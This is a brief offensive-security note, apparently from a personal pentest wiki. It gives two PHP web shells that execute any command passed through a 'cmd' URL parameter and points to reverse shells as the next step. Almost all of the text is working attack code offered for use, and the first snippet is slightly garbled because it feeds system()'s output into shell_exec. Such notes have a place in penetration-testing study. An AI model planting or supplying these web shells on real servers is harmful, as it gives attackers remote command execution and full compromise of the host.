# PHP

This is used to execute command in the explorer using the parameter ?cmd=COMMAND in the url and after you can use a [[Reverse shells]] 

````php
<?php
	$cmd = system($_GET['cmd']);
	echo "<pre>" . shell_exec($cmd) . "</pre>";
?>
````

Or you can use only this:
````php
<?php
	system($_GET['cmd']);
?>
````

---

# Tags

#webshell #shell 

---